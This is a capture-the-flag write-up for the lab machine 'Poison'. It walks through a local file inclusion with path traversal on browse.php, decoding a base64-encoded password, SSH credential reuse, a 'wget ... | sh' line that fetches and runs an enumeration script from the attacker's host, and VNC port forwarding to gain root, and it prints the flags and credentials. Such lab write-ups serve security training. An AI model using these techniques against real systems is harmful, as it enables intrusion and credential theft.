# Poison

## Recon

::: details nmap_scan.log
```log
Open 10.129.1.254:22
Open 10.129.1.254:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.129.1.254

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU=
|   256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```
:::

## HTTP (80)

![Writeup.png](/assets/pentest/htb/poison/Writeup.png)

```bash
└─$ curl http://10.129.1.254/browse.php?file=listfiles.php
Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
└─$ curl http://10.129.1.254/browse.php?file=pwdbackup.txt
This password is secure, it\'s encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

[Recipe](https://gchq.github.io/CyberChef/#recipe=Label('loop')From_Base64('A-Za-z0-9%2B/%3D',true,false)Jump('loop',12)&input=Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVUm5kVlJscHpXa1pPYWxKc1dqQlVWbHBQVjBaS2MySkVUbGhoTWsweFZtcEtTMUl5U2tWVQpiR2hvVFZWd1ZWWnRjRWRaVjAxNVUydFdWUXBpUjJodlZGWldkMVpXV25SalJXUlVUV3hLU1ZadGRHdFhRWEJwVW01Q1VGZFdaREJTCmJWWkhWMjVTYWxKWVVsVlVWbFV4VTFaYWRHUkdaRlphTTBKd1ZteGFkMWRXV25STlZGSnFDazFFUWpSWGExcHJXVlpLUjFOc1ZsVlcKTTA0MFZHdGFhMk50UmtkYVIyaFdWMFZLVlZkWGVHRlRNVlpIV2tab1RsWkdTbFJEYXpGRlVXcFNWMDFxVmxSWlZFWkxZekpPU1ZScwpXbWtLVjBkb05sWkhlR0ZaVms1SVZXdHNWV0pYYUZkV01GWkxWbFprV0dWSFJsUk5iRVkwVmpJMVUyRXhTWGRYYlVaRVlrWndlbFl5CmVHOVhSMFY0WTBoS1dGWnNjRXhWYWtaUFpFWktjd3BhUjJkTFdWUkNXazFHV2toa1IwWmFWbXMxUjFSc1dtdFpWa2w1WVVaa1YwMUcKV2t4V2JGcHJWMGRXU0ZKc1VrNVdia0paVm1wS01HRXhXblJTV0hCV1ltdEtSVmxZY0VkbFZteHlDbFZzVGxkTlJFWjRWbTEwTkZZdwpNWFZVYWs1aFZtMVNTRlZxUmxkamQzQnFVakowVEZaWE1ERlJNa2w0V2toT1lWSkdTbGhVVjNoTFVqRlNjMWR0ZEZwV2EydzFXVlZhClQxWXdNVWNLVjJ0NFYySkdjSEpXTUdSWFUwZFNTR0pGTldsU1dFRXlWbXBLTUZsWFJYaFhibEpUVjBoQ1YxbHRjekZTVm14elZtNWsKV0ZKc2JEVkRiVkpJVDFaa1RsSkZXalJXYlRFd1RrWmtSd3BYYms1cVVsaG9WMWxYZEdGVlJtdzJVbXhrYW1RelFsaFphMlJQVkVaawpXR1JIT1ZKaVZscDZWakkxVTJGc1NsaFZiR1JWVm14d2VsUnJXbHBsVlRWV1QxWndWMkV5ZHpGWFZsWmhDbUV4V1hkTlZXTkxWakowCk5GWXlTa2RqUjJoaFVsWldORlpzV2tka1IxSkdUbGRvVG1KdFRqTldiWEJMVFVkSmVGVllhR2xTYlZKV1dWUktiMVl4YkhKV1ZFWlQKVm0xNGVsWnRlSGNLVkcxS1IyTkVRa1JpVmxwSlZERmFhMkZXV2xsUmEzQllWbXhhZGxwRVJscGtkM0JPVjBWYVZGbHJaRzloUmxaegpXa1pPV0ZKc1duaFZiWE0xWVcxUmVsRnRhRlppVkVaUVZrVmFhd3BYUjFaSFYyMTBUbUpGV1RCV2Frb3dWakZWZVZOcmFGWmlSbkJXClZtcE9VMDB4Y0ZobFJtUllVakZhU0ZkcldsZGhWa3BaVVcxR1YyRXlVWGREYXpWSFUydGthbEpHYkV4V1JsWlRDbU14U2tkalJGcE8KVWtkNFJWZHViM2RQVlU1dVVGUXdTd289)

![Writeup-1.png](/assets/pentest/htb/poison/Writeup-1.png)

> Password: `Charix!2#4%6&8(0`

The applications allows including files, so it's vulnerable to LFI.
```bash
└─$ curl http://10.129.1.254/browse.php?file=../../../../../../etc/passwd -s | grep sh$
root:*:0:0:Charlie &:/root:/bin/csh
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

## SSH (22)

> Creds: `charix:Charix!2#4%6&8(0`

```bash
└─$ ssh charix@10.129.1.254
charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
```

### User.txt

```bash
charix@Poison:~ % cat user.txt
eaacdfb2d141b72a589233063604209c
```

## Privilege Escalation

```bash
charix@Poison:~ % unzip secret.zip -d secret
Archive:  secret.zip
 extracting: secret/secret |
unzip: Passphrase required for this entry
---
└─$ scp charix@10.129.1.254:secret.zip .
└─$ zip2john secret.zip | tee secret.hash
ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 type=0
secret.zip/secret:$pkzip$1*1*2*0*14*8*77537827*0*24*0*14*7753*8061b9caf8436874ad47a9481863b54443379d4c*$/pkzip$:secret:secret.zip::secret.zip
```

John is unsuccessful
```bash
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=.\rockyou.txt .\hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2024-11-26 22:46) 0g/s 6829Kp/s 6829Kc/s 6829KC/s !joley08!..♦*♥7¡Vamos!♥
Session completed
```

Trying the user's password is successful
```bash
└─$ unzip -d secret -P 'Charix!2#4%6&8(0' secret.zip
Archive:  secret.zip
 extracting: secret/secret
└─$ cd secret
└─$ file secret
secret: Non-ISO extended-ASCII text, with no line terminators
└─$ ls -alh
Permissions Size User  Date Modified Name
.r--r--r--     8 woyag 24 Jan  2018   secret
└─$ xxd secret
00000000: bda8 5b7c d596 7a21                      ..[|..z!
```

Nothing usable for now, let's enumerate further.
```bash
charix@Poison:~ % wget 10.10.14.99/lp.sh -O-|sh|tee /tmp/lp.log
...
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/home/charix/bin
...
                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
...
root    620  0.0  0.5  56320  5396  -  S    19:34    0:00.59 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local/lib/open-vm-tools/plugins/vmsvc
...
root    608  0.0  0.9  23620  8868 v0- I    19:34    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
root    621  0.0  0.7  67220  7064 v0- I    19:34    0:00.01 xterm -geometry 80x24+10+10 -ls -title X Desktop
charix 2319  0.0  0.3  21208  2668  1  R+   19:55    0:00.00 ps fauxwww
...
                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/fetch
/usr/bin/gdb
/usr/bin/make
/usr/bin/nc
/usr/local/bin/ncat
/usr/local/bin/perl
/usr/local/bin/php
/sbin/ping
/usr/local/bin/python
/usr/local/bin/python2
/usr/local/bin/python2.7
/usr/local/bin/ruby
/usr/local/bin/wget
/usr/local/bin/xterm
...
charix@Poison:~ % netstat -a
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.129.1.254.ssh       10.10.14.99.41048      ESTABLISHED
tcp4       0      0 10.129.1.254.http      10.10.14.99.37394      FIN_WAIT_2
tcp4       0      0 localhost.smtp         *.*                    LISTEN
tcp4       0      0 *.http                 *.*                    LISTEN
tcp6       0      0 *.http                 *.*                    LISTEN
tcp4       0      0 *.ssh                  *.*                    LISTEN
tcp6       0      0 *.ssh                  *.*                    LISTEN
tcp4       0      0 localhost.5801         *.*                    LISTEN
tcp4       0      0 localhost.5901         *.*                    LISTEN
udp4       0      0 *.syslog               *.*
udp6       0      0 *.syslog               *.*
```

The VNC service is odd to see, especially as root. The secret file could be vnc password file. 

Port forward first
```bash
└─$ ssh charix@10.129.1.254 -L 5901:0:5901
```

```bash
└─$ vncviewer localhost:5901 -passwd secret
```

![Writeup-2.png](/assets/pentest/htb/poison/Writeup-2.png)

### Root.txt

```bash
# cat root.txt
716d04b188419cf2bb99d891272361f5
```